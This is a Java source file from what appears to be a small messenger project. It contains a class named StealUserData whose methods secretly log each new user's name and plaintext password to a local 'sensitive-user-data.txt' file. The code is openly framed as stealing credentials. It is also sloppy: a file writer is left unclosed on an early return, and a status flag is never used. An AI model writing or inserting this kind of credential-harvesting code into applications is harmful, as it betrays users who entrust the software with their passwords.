package com.vladimirsimek.messenger;

import java.io.*;

import static com.vladimirsimek.messenger.Data.name;
import static com.vladimirsimek.messenger.Data.password;
import static com.vladimirsimek.messenger.UserInterface.row;

public class StealUserData {

    public static void stealUserData() {
        try {
            BufferedWriter bw = new BufferedWriter(new FileWriter("data/existing-users.txt", true));
            BufferedReader br = new BufferedReader(new FileReader("data/existing-users.txt"));

            String line = br.readLine();
            boolean isAlreadyCollected = false;

            while (line != null) {
                if (line.equals(name)) {
                    isAlreadyCollected = true;
                    return;
                }
                line = br.readLine();
            }
            br.close();

            bw.write(name);
            bw.newLine();
            bw.close();

            stealNameData();
            stealPasswordData();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void stealPasswordData() {
        try {
            BufferedWriter bw = new BufferedWriter(new FileWriter("data/sensitive-user-data.txt", true));
            bw.write("Users Password: " + password);
            bw.newLine();
            bw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    } //TODO:

    public static void stealNameData() {
        try {
            BufferedWriter bw = new BufferedWriter(new FileWriter("data/sensitive-user-data.txt", true));
            bw.write("Users name: " + name);
            bw.newLine();
            bw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    } //TODO:


}
